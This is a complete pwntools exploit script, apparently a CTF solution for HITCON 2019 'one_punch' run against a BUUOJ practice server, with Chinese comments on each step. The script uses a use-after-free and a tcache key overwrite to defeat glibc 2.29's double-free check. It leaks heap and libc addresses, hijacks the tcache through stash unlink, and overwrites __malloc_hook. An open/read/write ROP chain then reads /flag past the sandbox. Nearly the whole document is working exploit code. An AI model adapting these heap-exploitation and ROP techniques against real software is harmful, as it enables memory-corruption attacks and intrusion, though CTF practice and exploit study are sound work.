#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 27583
elfpath = './hitcon_ctf_2019_one_punch_patched'
ldpath = './ld-2.29.so'
libcpath = './libc-2.29.so'
e = ELF(elfpath)
context.binary = e
libc = ELF(libcpath)

context.binary = e

if args.LOCAL:
    p = process([e.path])
    # gdb.attach(p)
else:
    p = remote(host, port)

# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def rn(n): return p.recvn(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(func, address): return p.success(
    "{} ==> {}".format(func, hex(address)))


def command(c):
    ru(b'> ')
    sl(str(c).encode())
    # s(str(c).encode())


def add(index, size, content=b"zyleo"):
    command(1)
    ru(b"idx: ")
    sl(str(index).encode())
    ru(b"hero name: ")
    s(content.ljust(size, b"a"))


def edit(index, content):
    command(2)
    ru(b"idx: ")
    sl(str(index).encode())
    ru(b"hero name: ")
    s(content)


def free(index):
    command(4)
    ru(b"idx: ")
    sl(str(index).encode())


def show(index):
    command(3)
    ru(b"idx: ")
    sl(str(index).encode())
    ru(b"hero name: ")


def onePunch(content):
    command(50056)
    s(content)
    ru(b"Serious Punch!!!\n")


# start pwning
'''
glibc 2.29
orw沙箱
存在uaf
'''

add(0, 0x218)
add(1, 0x80)

# 填充tcache_bin[0x90]到6，剩余一个位置配合tcache stash unlink
for i in range(6):
    free(1)
    # 修改 tcache_entry里的key字段，绕过double free检查
    edit(1, b'a'*0x10)

# 填充tcache_bin[0220]到6
for i in range(6):
    free(0)
    edit(0, b'a'*0x10)

# 泄露堆地址
free(0)
show(0)
heap_base = u64(rn(6).ljust(8, b"\x00")) - 0x260
leak("heap addr", heap_base)

edit(0, b'a'*0x10)

# tcache bin[0x220]已经满了，所以这里free会将0x220大小的chunk0送入unsorted bin
free(0)
# 泄露libc
show(0)
libc_base = u64(rn(6).ljust(8, b"\x00")) - (0x7f50ff07bca0 - 0x7f50fee97000)
leak("libc addr", libc_base)

# 切割unsorted bin，0x220切完之后还剩0x90大小在unsorted bin中
# 注意，此时1和0指向的地址是相同的
add(1, 0x180)
# 将第一个0x90的chunk送入small bin
add(1, 0x400)
# free(1)时防止与top chunk合并
add(2, 0x200)

for i in range(7):
    free(1)
    edit(1, b'a'*0x10)

# 将 0x410 chunk 送入 unsorted bin
free(1)

# 同样，进行切分，切完0x380后还剩0x90
add(2, 0x370)
# 将0x90 大小的第二个chunk送入small bin
add(2, 0x400)

pld1 = b"a"*0x370
pld1 += p64(0) + p64(0x91)
fake_fd = heap_base + 0x3e0
fake_bk = heap_base + 0x20  # 对应于onepunch中对于tcache struct的检查位置
pld1 += p64(fake_fd) + p64(fake_bk)
edit(1, pld1)

# 触发 tcache stash
# 执行
# fake_bk -> fd = smallbin[0x90]
add(1, 0x80)

# 0 对应的chunk就是刚刚被加入到tcache bin[0x90]中的chunk
# 所以这里的操作相当于劫持tcache bin[0x220]
edit(0, p64(libc.sym["__malloc_hook"] + libc_base))

# gadgets
# 有个问题，pop rdi/rsi这种好找
# 但是像add rsp, 48 ; ret这种，该怎么确定48这个数字呢？
# 真的就靠捕捉到调用__malloc_hook这一步吗？
add_rsp_48 = libc_base + 0x000000000008cfd6
pop_rdi = libc_base + 0x0000000000026542
pop_rsi = libc_base + 0x0000000000026f9e
pop_rdx = libc_base + 0x000000000012bda6
pop_rax = libc_base + 0x0000000000047cf8
syscall_ret = libc_base + 0x000000000010D022

# 现在通过onepunch来分配tcache bin中的chunk
onePunch(b"flag\x00")  # "/flag" 被写在chunk 0中
flag_addr = heap_base + 0x260
onePunch(p64(add_rsp_48))

# gdb.attach(p)

ropchain = flat([
    # open("/flag", 0)
    pop_rdi, flag_addr,
    pop_rsi, 0,
    pop_rax, 2,
    syscall_ret,
    # read(3, flag_addr, 0x30)
    pop_rdi, 3,
    pop_rsi, flag_addr,
    pop_rdx, 0x30,
    pop_rax, 0,
    syscall_ret,
    # write(1, flag_addr, 0x30)
    pop_rdi, 1,
    pop_rsi, flag_addr,
    pop_rdx, 0x30,
    pop_rax, 1,
    syscall_ret
])
add(1, 0x100, content=ropchain)

shell()
